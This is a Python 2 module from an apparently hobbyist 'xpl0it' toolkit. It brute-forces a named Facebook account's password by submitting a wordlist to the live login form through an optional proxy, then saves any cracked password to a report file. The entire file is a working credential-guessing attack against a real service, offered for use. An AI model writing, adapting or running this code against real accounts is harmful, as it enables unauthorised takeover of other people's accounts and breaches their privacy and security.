#!/usr/bin/python
#fbcrack.py

#fbcrack module for xpl0it v0.3
#Coded by wrh1d3 -> wrh1d3[at]gmail[dot]com
#Copyright (c) 2016-2017 J3kill Soft. by wrh1d3

import os, time

from auxilliary.proxy import *
from auxilliary.browser import *
from auxilliary.utils import *

class fbcrack:
	
	def __init__(self, args):
		self.target = args[1]
		self.proxy = args[2]
		self.proxy_type = args[3]
		self.verbose = args[4]
		self.login_page = "https://www.facebook.com"
		self.wordslist = os.getcwd() + "/wordslist/pass.txt"
		self.results = ""
		
	def crack(self):
		print "\n[+] Target: " + self.target
		if self.verbose == 1:
			print "[!] Checking proxy..."
			
		if self.proxy != "":
			hst, prt = parse_address(self.proxy)
			pr = proxy(hst, prt, self.proxy_type)
			if pr.set_browser_proxy() == True:  
				print "[+] Proxy: " + self.proxy
			else:
				print "[-] Invalid or dead proxy"
		else:
			print "[-] Proxy not set"
				
		print
		
		if self.verbose == 1:
			print "[!] Connecting to target...\n"
		br = browser()
				
		try:
			br.open(self.login_page)
			
			if self.verbose == 1:
				print "[!] Checking wordslists..."
				
			passwords = open(self.wordslist, "r").readlines()
				
			if self.verbose == 1:
				print "[!] Attack started...\n"
			
			for word in passwords:
				password = word.replace("\n", "")
				print "[*] Trying: " + password			
				br.select_form(nr = 0)  
				br.form['email'] = self.target
				br.form['pass'] = password
				resp = br.submit()
				if "login_attempt" not in resp.geturl():
					self.results = "Password is " + password
					print "[+] " + self.results
					break
		except:
			self.results = "Failed to crack password"
			print "[-] Failed to connect to target"
			print "[-] " + self.results + "\n"
					
	def generate_report(self):
		date = time.strftime("%d-%m-%Y")
		filename = "fbcrack_report_%s.txt" %(date)
		
		if not os.path.exists(os.getcwd() + "/reports/" + filename): 
			f = open(os.getcwd() + "/reports/" + filename, "w")
			f.writelines("[!] xpl0it penetration testing toolkit -> fbcrack report\n\n")
			
		f = open(os.getcwd() + "/reports/" + filename, "a")
		f.writelines("Target: " + self.target + "\n")
		f.writelines("Results: \n\n" + self.results + "\n\n")
